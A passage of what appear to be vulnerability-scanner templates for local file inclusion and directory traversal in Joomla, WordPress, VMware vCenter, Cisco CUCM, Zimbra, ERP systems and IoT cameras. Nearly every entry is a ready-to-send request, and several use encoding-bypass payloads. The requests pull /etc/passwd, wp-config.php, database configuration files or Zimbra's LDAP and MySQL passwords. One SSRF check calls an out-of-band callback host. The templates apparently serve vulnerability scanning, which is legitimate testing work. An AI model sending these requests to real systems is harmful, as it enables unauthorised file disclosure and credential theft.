- tags - xss,edb,phpwiki,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/phpwiki/index.php/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# EWEBS - Local File Inclusion

## Description

- EWEBS is vulnerable to local file inclusion and allows remote attackers to disclose the content of locally stored files via the 'Language_S' parameter supplied to the 'casmain.xgi' endpoint.
- severity - high
- tags - ewebs,lfi

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/casmain.xgi
  - Language_S=../../Data/CONFIG/CasDbCnn.dat

### Matchers

**Type - word**

- words
  1. [Edition]
  2. [LocalInfo]
- condition - and
- part - body

**Type - status**

- status
  1. 200

---

# Carel pCOWeb HVAC BACnet Gateway 2.1.0 - Local File Inclusion

## Description

- Carel pCOWeb HVAC BACnet Gateway 2.1.0 is vulnerable to local file inclusion because of input passed through the 'file' GET parameter through the 'logdownload.cgi' Bash script is not properly verified before being used to download log files. This can be exploited to disclose the contents of arbitrary and sensitive files via directory traversal attacks.
- severity - high
- tags - carel,lfi,traversal,unauth,bacnet

## Requests

- Method - GET

### URL

- {{BaseURL}}/usr-cgi/logdownload.cgi?file=../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

---

# Digital Rebar - Local File Inclusion

## Description

- Digital Rebar versions 4.3.0, 4.3.2, 4.3.3, 4.4.0, and maybe others are vulnerable to local file inclusion because web requests can navigate outside of DRP controlled areas.
- severity - high
- tags - lfi,rackn,digitalrebar

## Requests

- Method - GET

### URL

- {{BaseURL}}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0

**Type - word**

- part - header
- words
  1. X-Drp-Sha256sum:

**Type - status**

- status
  1. 200

---

# Wooyun - Local File Inclusion

## Description

- Wooyun is vulnerable to local file inclusion.

- severity - high
- tags - lfi,wooyun

## Requests

- Method - GET

### URL

- {{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xml

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. \<DataSourceClassName>
  2. \</DataSourceClassName>
- part - body
- condition - and

---

# ERP-NC - Local File Inclusion

## Description

- ERP-NC is vulnerable to local file inclusion.
- severity - high
- tags - lfi,erp-nc

## Requests

- Method - GET

### URL

- {{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=

### Matchers

**Type - word**

- words
  1. Client
  2. ncwslogin.jsp
  3. admin.jsp
- part - body
- condition - and

**Type - status**

- status
  1. 200

---

# ThinkCMF - Local File Inclusion

## Description

- ThinkCMF is vulnerable to local file inclusion.
- severity - high
- tags - thinkcmf,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/?a=display&templateFile=README.md

### Matchers

**Type - word**

- condition - and
- words
  1. ThinkCMF
  2. ## README
  3. ## UPDATE

**Type - status**

- status
  1. 200

---

# Liferay - Resource leakage through I18nServlet

## Description

- I18n Servlet leaks information by sending an HTTP request to /[language]/[resource];.js (also .jsp works).

- severity - high
- tags - liferay,lfi,j2ee

## Requests

- Method - GET

### URL

- {{BaseURL}}/en/WEB-INF/web.xml;.js

### Matchers

**Type - word**

- part - body
- words
  1. \<web-app id=
  2. \<?xml
- condition - and

**Type - word**

- part - header
- words
  1. application/xml

**Type - status**

- status
  1. 200

---

# Moodle Jmol Filter 6.1 - Local File Inclusion

## Description

- Moodle is vulnerable to local file inclusion.
- severity - high
- tags - moodle,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&query=file:///etc/passwd

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

---

# Joomla! Component com_sef - Local File Inclusion

## Description

- A local file inclusion vulnerability in the Jvehicles (com_jvehicles) component version 1.0 for Joomla! allows remote attackers to load arbitrary files via the controller parameter in index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_jvehicles&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0

**Type - status**

- status
  1. 200

---

# Linux Vmware Vcenter - Local File Inclusion

## Description

- Linux appliance based Vmware Vcenter is vulnerable to local file inclusion.
- severity - high
- tags - vmware,lfi,vcenter

## Requests

- Method - GET

### URL

- {{BaseURL}}/eam/vib?id=/etc/issue

### Matchers

**Type - word**

- words
  1. vCenter Server

---

# VMware vCenter - Local File Inclusion

## Description

- VMware vCenter is vulnerable to local file inclusion.
- severity - high
- tags - vmware,lfi,vcenter

## Requests

### Step - 1

```
GET /eam/vib?id={{path}}\vcdb.properties HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - regex**

- regex
  1. (?m)^(driver|dbtype|password(\.encrypted)?)\s=

**Type - status**

- status
  1. 200

**Payloads**- path

---

# VMware vCenter - Server-Side Request Forgery/Local File Inclusion/Cross-Site Scripting

## Description

- VMware vCenter 7.0.2.00100 is susceptible to multiple vulnerabilities including server-side request forgery, local file inclusion, and cross-site scripting.
- severity - critical
- tags - ssrf,lfi,xss,oast,vcenter,vmware

## Requests

- Method - GET

### URL

- {{BaseURL}}/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=https://{{interactsh-url}}

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

**Type - status**

- status
  1. 200

---

# WeiPHP 5.0 - Path Traversal

## Description

- WeiPHP 5.0 is susceptible to directory traversal attacks.
- severity - high
- tags - weiphp,lfi,cnvd,cnvd2020

## Requests

### Step - 1

```
POST /public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

"1":1

```

### Step - 2

```
GET /public/index.php/home/file/user_pics HTTP/1.1
Host: {{Hostname}}

```

### Step - 3

```
GET {{endpoint}} HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. https://weiphp.cn
  2. WeiPHP
  3. DB_PREFIX
- condition - and

### Extractors

**Type - regex**

- name - endpoint
- part - body
- internal - True
- regex
  1. /public/uploads/picture/(.\*.jpg)

---

# Xxunchi CMS - Local File Inclusion

## Description

- Xunyou CMS is vulnerable to local file inclusion. Attackers can use vulnerabilities to obtain sensitive information.
- severity - high
- tags - xunchi,lfi,cnvd,cnvd2020

## Requests

- Method - GET

### URL

- {{BaseURL}}/backup/auto.php?password=NzbwpQSdbY06Dngnoteo2wdgiekm7j4N&path=../backup/auto.php

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- part - body
- words
  1. NzbwpQSdbY06Dngnoteo2wdgiekm7j4N
  2. display_errors
- condition - and

---

# Seeyon - Local File Inclusion

## Description

- Seeyon is vulnerable to local file inclusion.
- severity - medium
- tags - lfi,cnvd,cnvd2020,seeyon

## Requests

- Method - GET

### URL

- {{BaseURL}}/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- part - header
- words
  1. application/x-msdownload
- condition - and

**Type - word**

- part - body
- words
  1. ctpDataSource.password
- condition - and

---

# Metinfo - Local File Inclusion

## Description

- Metinfo is susceptible to local file inclusion.
- severity - high
- tags - metinfo,cnvd,cvnd2018,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/include/thumb.php?dir=http\..\admin\login\login_check.php

### Matchers

**Type - word**

- part - body
- words
  1. \<?php
  2. login_met_cookie($metinfo_admin_name);
- condition - and

---

# ShopXO Download File Read

- severity - high
- tags - shopxo,lfi,cnvd,cnvd2021

## Requests

### Step - 1

```
GET /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q=  HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

```

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Ruoyi Management System - Local File Inclusion

## Description

- The Ruoyi Management System contains a local file inclusion vulnerability that allows attackers to retrieve arbitrary files from the operating system.
- severity - high
- tags - ruoyi,lfi,cnvd,cnvd2021

## Requests

- Method - GET

### URL

- {{BaseURL}}/common/download/resource?resource=/profile/../../../../etc/passwd
- {{BaseURL}}/common/download/resource?resource=/profile/../../../../Windows/win.ini

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0

**Type - word**

- part - body
- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and

---

# Landray-OA - Local File Inclusion

## Description

- Landray-OA is susceptible to local file inclusion.
- severity - high
- tags - landray,lfi,cnvd,cnvd2021

## Requests

### Step - 1

```
POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: application/x-www-form-urlencoded

var={"body":{"file":"file:///etc/passwd"}}

```

### Step - 2

```
POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: application/x-www-form-urlencoded

var={"body":{"file":"file:///c://windows/win.ini"}}

```

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
  2. for 16-bit app support
- condition - or

**Type - status**

- status
  1. 200

---

# Selea Targa IP OCR-ANPR Camera - Local File Inclusion

## Description

- Selea Targa IP OCR-ANPR camera suffers from an unauthenticated local file inclusion vulnerability because input passed through the Download Archive in Storage page using get_file.php script is not properly verified before being used to download files. This can be exploited to disclose the contents of arbitrary and sensitive files via directory traversal attacks and aid the attacker in disclosing clear-text credentials.
- severity - high
- tags - targa,lfi,iot,camera,selea

## Requests

- Method - GET

### URL

- {{BaseURL}}/CFCARD/images/SeleaCamera/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Linux based LFI Fuzzing

## Description

- Fuzzes for /etc/passwd on passed URLs
- severity - high
- tags - linux,lfi,fuzz

## Requests

- Method - GET

### URL

- {{BaseURL}}/?q=../../../etc/passwd&s=../../../etc/passwd&search=../../../etc/passwd&id=&action=../../../etc/passwd&keyword=../../../etc/passwd&query=../../../etc/passwd&page=../../../etc/passwd&keywords=../../../etc/passwd&url=../../../etc/passwd&view=../../../etc/passwd&cat=../../../etc/passwd&name=../../../etc/passwd&key=../../../etc/passwd&p=../../../etc/passwd
- {{BaseURL}}/?q=../../../etc/passwd%00&s=../../../etc/passwd%00&search=../../../etc/passwd%00&id=../../../etc/passwd%00&action=../../../etc/passwd%00&keyword=../../../etc/passwd%00&query=../../../etc/passwd%00&page=../../../etc/passwd%00&keywords=../../../etc/passwd%00&url=../../../etc/passwd%00&view=../../../etc/passwd%00&cat=../../../etc/passwd%00&name=../../../etc/passwd%00&key=../../../etc/passwd%00&p=../../../etc/passwd%00
- {{BaseURL}}/?q=%252e%252e%252fetc%252fpasswd&s=%252e%252e%252fetc%252fpasswd&search=%252e%252e%252fetc%252fpasswd&id=%252e%252e%252fetc%252fpasswd&action=%252e%252e%252fetc%252fpasswd&keyword=%252e%252e%252fetc%252fpasswd&query=%252e%252e%252fetc%252fpasswd&page=%252e%252e%252fetc%252fpasswd&keywords=%252e%252e%252fetc%252fpasswd&url=%252e%252e%252fetc%252fpasswd&view=%252e%252e%252fetc%252fpasswd&cat=%252e%252e%252fetc%252fpasswd&name=%252e%252e%252fetc%252fpasswd&key=%252e%252e%252fetc%252fpasswd&p=%252e%252e%252fetc%252fpasswd
- {{BaseURL}}/?q=%252e%252e%252fetc%252fpasswd%00&s=%252e%252e%252fetc%252fpasswd%00&search=%252e%252e%252fetc%252fpasswd%00&id=%252e%252e%252fetc%252fpasswd%00&action=%252e%252e%252fetc%252fpasswd%00&keyword=%252e%252e%252fetc%252fpasswd%00&query=%252e%252e%252fetc%252fpasswd%00&page=%252e%252e%252fetc%252fpasswd%00&keywords=%252e%252e%252fetc%252fpasswd%00&url=%252e%252e%252fetc%252fpasswd%00&view=%252e%252e%252fetc%252fpasswd%00&cat=%252e%252e%252fetc%252fpasswd%00&name=%252e%252e%252fetc%252fpasswd%00&key=%252e%252e%252fetc%252fpasswd%00&p=%252e%252e%252fetc%252fpasswd%00
- {{BaseURL}}/?q=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&s=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&search=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&id=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&action=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&keyword=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&query=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&keywords=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&url=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&view=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&cat=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&name=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&key=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&p=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
- {{BaseURL}}/?q=....//....//etc/passwd&s=....//....//etc/passwd&search=....//....//etc/passwd&id=....//....//etc/passwd&action=....//....//etc/passwd&keyword=....//....//etc/passwd&query=....//....//etc/passwd&page=....//....//etc/passwd&keywords=....//....//etc/passwd&url=....//....//etc/passwd&view=....//....//etc/passwd&cat=....//....//etc/passwd&name=....//....//etc/passwd&key=....//....//etc/passwd&p=....//....//etc/passwd
- {{BaseURL}}/?q=..///////..////..//////etc/passwd&s=..///////..////..//////etc/passwd&search=..///////..////..//////etc/passwd&id=..///////..////..//////etc/passwd&action=..///////..////..//////etc/passwd&keyword=..///////..////..//////etc/passwd&query=..///////..////..//////etc/passwd&page=..///////..////..//////etc/passwd&keywords=..///////..////..//////etc/passwd&url=..///////..////..//////etc/passwd&view=..///////..////..//////etc/passwd&cat=..///////..////..//////etc/passwd&name=..///////..////..//////etc/passwd&key=..///////..////..//////etc/passwd&p=..///////..////..//////etc/passwd
- {{BaseURL}}/?q=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&s=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&search=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&id=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&action=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&keyword=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&query=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&keywords=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&url=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&view=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&cat=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&name=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&key=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&p=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
- {{BaseURL}}/?q=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&s=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&search=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&id=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&action=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&keyword=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&query=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&keywords=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&url=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&view=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&cat=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&name=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&key=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&p=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
- {{BaseURL}}/?url=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
- {{BaseURL}}/?redirect=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
- {{BaseURL}}/?page=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
- {{BaseURL}}/?q=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
- {{BaseURL}}/image?filename=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
- {{BaseURL}}/image?name=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
- {{BaseURL}}/file?filename=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
- {{BaseURL}}/file?name=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
- {{BaseURL}}/image?filename=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
- {{BaseURL}}/image?name=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
- {{BaseURL}}/file?filename=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
- {{BaseURL}}/file?name=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
- {{BaseURL}}/?q=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
- part - body

---

# Chyrp 2.x - Local File Inclusion

## Description

- A directory traversal vulnerability in includes/lib/gz.php in Chyrp 2.0 and earlier allows remote attackers to read arbitrary files via a .. (dot dot) in the file parameter, a different vulnerability than CVE-2011-2744.
- severity - high
- tags - cve,cve2011,lfi,chyrp

## Requests

- Method - GET

### URL

- {{BaseURL}}/includes/lib/gz.php?file=/themes/../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Chyrp 2.x - Local File Inclusion

## Description

- A directory traversal vulnerability in Chyrp 2.1 and earlier allows remote attackers to include and execute arbitrary local files via a ..%2F (encoded dot dot slash) in the action parameter to the default URI.
- severity - high
- tags - cve,cve2011,lfi,chyrp,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/?action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component com_kp - 'Controller' Local File Inclusion

## Description

- A directory traversal vulnerability in the obSuggest (com_obsuggest) component before 1.8 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - lfi,edb,cve,cve2011,joomla

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_kp&controller=../../../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# WP Custom Pages 0.5.0.1 - Local File Inclusion (LFI)

## Description

- A directory traversal vulnerability in wp-download.php in the WP Custom Pages module 0.5.0.1 for WordPress allows remote attackers to read arbitrary files via ..%2F (encoded dot dot) sequences in the url parameter.
- severity - high
- tags - edb,cve,cve2011,wordpress,wp-plugin,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/wp-custom-pages/wp-download.php?url=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Cisco CUCM, UCCX, and Unified IP-IVR- Directory Traversal

## Description

- A directory traversal vulnerability in Cisco Unified Communications Manager (CUCM) 5.x and 6.x before 6.1(5)SU2, 7.x before 7.1(5b)SU2, and 8.x before 8.0(3), and Cisco Unified Contact Center Express (aka Unified CCX or UCCX) and Cisco Unified IP Interactive Voice Response (Unified IP-IVR) before 6.0(1)SR1ES8, 7.0(x) before 7.0(2)ES1, 8.0(x) through 8.0(2)SU3, and 8.5(x) before 8.5(1)SU2, allows remote attackers to read arbitrary files via a crafted URL, aka Bug IDs CSCth09343 and CSCts44049.
- severity - high
- tags - cve,cve2011,lfi,cisco,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/ccmivr/IVRGetAudioFile.do?file=../../../../../../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Majordomo2 - SMTP/HTTP Directory Traversal

## Description

- A directory traversal vulnerability in the \_list_file_get function in lib/Majordomo.pm in Majordomo 2 before 20110131 allows remote attackers to read arbitrary files via .. (dot dot) sequences in the help command, as demonstrated using (1) a crafted email and (2) cgi-bin/mj_wwwusr in the web interface.
- severity - high
- tags - cve,cve2011,majordomo2,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/cgi-bin/mj_wwwusr?passw=&list=GLOBAL&user=&func=help&extra=/../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress Plugin Advanced Dewplayer 1.2 - Directory Traversal

## Description

- A directory traversal vulnerability in download-file.php in the Advanced Dewplayer plugin 1.2 for WordPress allows remote attackers to read arbitrary files via a .. (dot dot) in the dew_file parameter.
- severity - high
- tags - wp-plugin,lfi,edb,seclists,cve,cve2013,wordpress

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/advanced-dewplayer/admin-panel/download-file.php?dew_file=../../../../wp-config.php

### Matchers

**Type - word**

- words
  1. DB_NAME
  2. DB_PASSWORD
  3. DB_HOST
  4. The base configurations of the WordPress
- part - body
- condition - and

**Type - status**

- status
  1. 200

---

# Cisco Unified Communications Manager 7/8/9 - Directory Traversal

## Description

- A directory traversal vulnerability in the Tomcat administrative web interface in Cisco Unified Communications Manager allows remote authenticated users to read arbitrary files via directory traversal sequences in an unspecified input string, aka Bug ID CSCui78815
- severity - high
- tags - cve,cve2013,lfi,cisco,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/ccmadmin/bulkvivewfilecontents.do?filetype=samplefile&fileName=../../../../../../../../../../../../../../../../etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Xibo 1.2.2/1.4.1 - Directory Traversal

## Description

- A directory traversal vulnerability in Spring Signage Xibo 1.2.x before 1.2.3 and 1.4.x before 1.4.2 allows remote attackers to read arbitrary files via a .. (dot dot) in the p parameter to index.php.
- severity - high
- tags - cve,cve2013,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?p=../../../../../../../../../../../../../../../../etc/passwd%00index&q=About&ajax=true&\_=1355714673828

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Javafaces LFI

## Description

- An Unspecified vulnerability in the Oracle GlassFish Server component in Oracle Fusion Middleware 2.1.1, 3.0.1, and 3.1.2; the Oracle JDeveloper component in Oracle Fusion Middleware 11.1.2.3.0, 11.1.2.4.0, and 12.1.2.0.0; and the Oracle WebLogic Server component in Oracle Fusion Middleware 10.3.6.0 and 12.1.1 allows remote attackers to affect confidentiality via unknown vectors related to Java Server Faces or Web Container.
- severity - medium
- tags - edb,cve,cve2013,lfi,javafaces,oracle

## Requests

- Method - GET

### URL

- {{BaseURL}}/costModule/faces/javax.faces.resource/web.xml?loc=../WEB-INF
- {{BaseURL}}/costModule/faces/javax.faces.resource./WEB-INF/web.xml.jsf?ln=..
- {{BaseURL}}/faces/javax.faces.resource/web.xml?loc=../WEB-INF
- {{BaseURL}}/faces/javax.faces.resource./WEB-INF/web.xml.jsf?ln=..
- {{BaseURL}}/secureader/javax.faces.resource/web.xml?loc=../WEB-INF
- {{BaseURL}}/secureader/javax.faces.resource./WEB-INF/web.xml.jsf?ln=..
- {{BaseURL}}/myaccount/javax.faces.resource/web.xml?loc=../WEB-INF
- {{BaseURL}}/myaccount/javax.faces.resource./WEB-INF/web.xml.jsf?ln=..
- {{BaseURL}}/SupportPortlet/faces/javax.faces.resource/web.xml?loc=../WEB-INF
- {{BaseURL}}/SupportPortlet/faces/javax.faces.resource./WEB-INF/web.xml.jsf?ln=..

### Matchers

**Type - word**

- words
  1. \<web-app
  2. \</web-app>
- part - body
- condition - and

**Type - status**

- status
  1. 200

---

# Zimbra Collaboration Server 7.2.2/8.0.2 Local File Inclusion

## Description

- A directory traversal vulnerability in /res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz in Zimbra 7.2.2 and 8.0.2 allows remote attackers to read arbitrary files via a .. (dot dot) in the skin parameter. This can be leveraged to execute arbitrary code by obtaining LDAP credentials and accessing the service/admin/soap API.
- severity - critical
- tags - zimbra,lfi,edb,cve,cve2013

## Requests

- Method - GET

### URL

- {{BaseURL}}/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00
- {{BaseURL}}/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../etc/passwd%00

### Matchers

**Type - word**

- words
  1. zimbra_server_hostname
  2. zimbra_ldap_userdn
  3. zimbra_ldap_password
  4. ldap_postfix_password
  5. ldap_amavis_password
  6. ldap_nginx_password
  7. mysql_root_password
- condition - or

**Type - regex**

- regex
  1. root=.\*:0:0

---

# Joomla! Component com_communitypolls 1.5.2 - Local File Inclusion

## Description

- A directory traversal vulnerability in the Community Polls (com_communitypolls) component 1.5.2, and possibly earlier, for Core Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_communitypolls&controller=../../../../../../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component NoticeBoard 1.3 - Local File Inclusion

## Description

- A directory traversal vulnerability in the Code-Garage NoticeBoard (com_noticeboard) component 1.3 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_noticeboard&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component News Portal 1.5.x - Local File Inclusion

## Description

- A directory traversal vulnerability in the iJoomla News Portal (com_news_portal) component 1.5.x for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.
- severity - high
- tags - cve,cve2010,joomla,lfi,edb,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.php?option=com_news_portal&controller=../../../../../../../../../../etc/passwd%00

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Joomla! Component Music Manager - Local File Inclusion

## Description

